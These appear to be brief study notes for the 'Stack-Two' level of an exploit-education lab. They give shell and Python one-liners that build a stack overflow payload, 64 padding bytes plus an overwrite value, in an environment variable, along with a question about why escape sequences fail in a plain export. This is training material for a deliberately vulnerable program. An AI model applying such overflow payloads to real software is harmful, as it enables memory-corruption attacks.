# Stack-Two

* Set the enviroment variable in the bash shell prior to running the program

export ExploitEducation="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x0a\x09\x0a\x0d"
echo $ExploitEducation

Explain why the above doesn't work but why the below does
export ExploitEducation=$(python -c 'print "A"*64 + "\x0a\x09\x0a\x0d"')
echo $ExploitEducation

0x0d0a090a

ExploitEducation=$(python -c 'print "A"*64 + "\x0a\x09\x0a\x0d"')